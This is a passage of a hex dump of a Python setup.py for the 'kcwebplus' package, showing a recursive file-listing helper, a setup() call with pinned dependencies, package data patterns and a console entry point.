+00000550: 6669 6c65 2866 6f6c 6465 722b 222f 222b  file(folder+"/"+
+00000560: 6669 6c65 7329 3a0d 0a20 2020 2020 2020  files):..       
+00000570: 2020 2020 2069 6620 6669 6c65 733d 3d27       if files=='
+00000580: 5f5f 7079 6361 6368 655f 5f27 206f 7220  __pycache__' or 
+00000590: 6669 6c65 733d 3d27 2e67 6974 273a 0d0a  files=='.git':..
+000005a0: 2020 2020 2020 2020 2020 2020 2020 2020                  
+000005b0: 7061 7373 0d0a 2020 2020 2020 2020 2020  pass..          
+000005c0: 2020 656c 7365 3a0d 0a20 2020 2020 2020    else:..       
+000005d0: 2020 2020 2020 2020 206c 6973 7473 2e61           lists.a
+000005e0: 7070 656e 6428 666f 6c64 6572 2b22 2f22  ppend(folder+"/"
+000005f0: 2b66 696c 6573 290d 0a20 2020 2020 2020  +files)..       
+00000600: 2020 2020 2020 2020 2067 6574 5f66 696c           get_fil
+00000610: 6528 666f 6c64 6572 2b22 2f22 2b66 696c  e(folder+"/"+fil
+00000620: 6573 2c6c 6973 7473 290d 0a20 2020 2020  es,lists)..     
+00000630: 2020 2065 6c73 653a 0d0a 2020 2020 2020     else:..      
+00000640: 2020 2020 2020 7061 7373 0d0a 2020 2020        pass..    
+00000650: 7265 7475 726e 206c 6973 7473 0d0a 623d  return lists..b=
+00000660: 6765 745f 6669 6c65 2822 6b63 7765 6270  get_file("kcwebp
+00000670: 6c75 7322 2c5b 276b 6377 6562 706c 7573  lus",['kcwebplus
+00000680: 275d 290d 0a73 6574 7570 280d 0a20 2020  '])..setup(..   
+00000690: 206e 616d 6520 3d20 636f 6e66 6b63 775b   name = confkcw[
+000006a0: 226e 616d 6522 5d2c 0d0a 2020 2020 7665  "name"],..    ve
+000006b0: 7273 696f 6e20 3d20 636f 6e66 6b63 775b  rsion = confkcw[
+000006c0: 2276 6572 7369 6f6e 225d 2c0d 0a20 2020  "version"],..   
+000006d0: 206b 6579 776f 7264 7320 3d20 226b 6377   keywords = "kcw
+000006e0: 6562 706c 7573 222b 636f 6e66 6b63 775b  ebplus"+confkcw[
+000006f0: 2776 6572 7369 6f6e 275d 2c0d 0a20 2020  'version'],..   
+00000700: 2064 6573 6372 6970 7469 6f6e 203d 2063   description = c
+00000710: 6f6e 666b 6377 5b22 6465 7363 7269 7074  onfkcw["descript
+00000720: 696f 6e22 5d2c 0d0a 2020 2020 6c6f 6e67  ion"],..    long
+00000730: 5f64 6573 6372 6970 7469 6f6e 203d 2063  _description = c
+00000740: 6f6e 666b 6377 5b22 6c6f 6e67 5f64 6573  onfkcw["long_des
+00000750: 6372 6970 7469 6f6e 225d 2c0d 0a20 2020  cription"],..   
+00000760: 206c 6963 656e 7365 203d 2063 6f6e 666b   license = confk
+00000770: 6377 5b22 6c69 6365 6e73 6522 5d2c 0d0a  cw["license"],..
+00000780: 2020 2020 6175 7468 6f72 203d 2063 6f6e      author = con
+00000790: 666b 6377 5b22 6175 7468 6f72 225d 2c0d  fkcw["author"],.
+000007a0: 0a20 2020 2061 7574 686f 725f 656d 6169  .    author_emai
+000007b0: 6c20 3d20 636f 6e66 6b63 775b 2261 7574  l = confkcw["aut
+000007c0: 686f 725f 656d 6169 6c22 5d2c 0d0a 2020  hor_email"],..  
+000007d0: 2020 6d61 696e 7461 696e 6572 203d 2063    maintainer = c
+000007e0: 6f6e 666b 6377 5b22 6d61 696e 7461 696e  onfkcw["maintain
+000007f0: 6572 225d 2c0d 0a20 2020 206d 6169 6e74  er"],..    maint
+00000800: 6169 6e65 725f 656d 6169 6c20 3d20 636f  ainer_email = co
+00000810: 6e66 6b63 775b 226d 6169 6e74 6169 6e65  nfkcw["maintaine
+00000820: 725f 656d 6169 6c22 5d2c 0d0a 2020 2020  r_email"],..    
+00000830: 7572 6c3d 636f 6e66 6b63 775b 2775 726c  url=confkcw['url
+00000840: 275d 2c0d 0a20 2020 2070 6163 6b61 6765  '],..    package
+00000850: 7320 3d20 2062 2c0d 0a20 2020 2023 2064  s =  b,..    # d
+00000860: 6174 615f 6669 6c65 733d 5b28 2753 6372  ata_files=[('Scr
+00000870: 6970 7473 272c 205b 276b 6377 6562 706c  ipts', ['kcwebpl
+00000880: 7573 2f62 696e 2f6b 6377 2e65 7865 275d  us/bin/kcw.exe']
+00000890: 295d 2c0d 0a20 2020 2069 6e73 7461 6c6c  )],..    install
+000008a0: 5f72 6571 7569 7265 7320 3d20 5b27 6b63  _requires = ['kc
+000008b0: 7765 623e 3d35 2e32 3727 2c27 7079 4f70  web>=5.27','pyOp
+000008c0: 656e 5353 4c3d 3d32 332e 322e 3027 2c27  enSSL==23.2.0','
+000008d0: 6368 6172 6465 743d 3d34 2e30 2e30 272c  chardet==4.0.0',
+000008e0: 2761 7073 6368 6564 756c 6572 3d3d 332e  'apscheduler==3.
+000008f0: 362e 3327 2c27 7172 636f 6465 3d3d 362e  6.3','qrcode==6.
+00000900: 3127 2c27 7069 6c6c 6f77 3d3d 382e 342e  1','pillow==8.4.
+00000910: 3027 2c27 7073 7574 696c 3d3d 352e 372e  0','psutil==5.7.
+00000920: 3027 2c27 6f73 7332 3d3d 322e 3132 2e31  0','oss2==2.12.1
+00000930: 272c 2777 6562 736f 636b 6574 2d63 6c69  ','websocket-cli
+00000940: 656e 743d 3d31 2e33 2e31 275d 2c20 23e7  ent==1.3.1'], #.
+00000950: acac e4b8 89e6 96b9 e58c 850d 0a20 2020  .............   
+00000960: 2070 6163 6b61 6765 5f64 6174 6120 3d20   package_data = 
+00000970: 7b0d 0a20 2020 2020 2020 2027 273a 205b  {..        '': [
+00000980: 272a 2e68 746d 6c27 2c20 272a 2e6a 7327  '*.html', '*.js'
+00000990: 2c27 2a2e 6373 7327 2c27 2a2e 6a70 6727  ,'*.css','*.jpg'
+000009a0: 2c27 2a2e 706e 6727 2c27 2a2e 6769 6627  ,'*.png','*.gif'
+000009b0: 2c27 7365 7276 6572 272c 2773 6572 7665  ,'server','serve
+000009c0: 722e 7368 275d 2c0d 0a20 2020 207d 2c0d  r.sh'],..    },.
+000009d0: 0a20 2020 2065 6e74 7279 5f70 6f69 6e74  .    entry_point
+000009e0: 7320 3d20 7b0d 0a20 2020 2020 2020 2027  s = {..        '
+000009f0: 636f 6e73 6f6c 655f 7363 7269 7074 7327  console_scripts'
+00000a00: 3a5b 0d0a 2020 2020 2020 2020 2020 2020  :[..            
+00000a10: 276b 6377 6562 706c 7573 203d 206b 6377  'kcwebplus = kcw
+00000a20: 6562 706c 7573 2e6b 6377 6562 706c 7573  ebplus.kcwebplus
+00000a30: 3a65 7865 6375 7461 626c 6527 0d0a 2020  :executable'..  
+00000a40: 2020 2020 2020 5d0d 0a20 2020 207d 0d0a        ]..    }..
+00000a50: 29                                       )
```

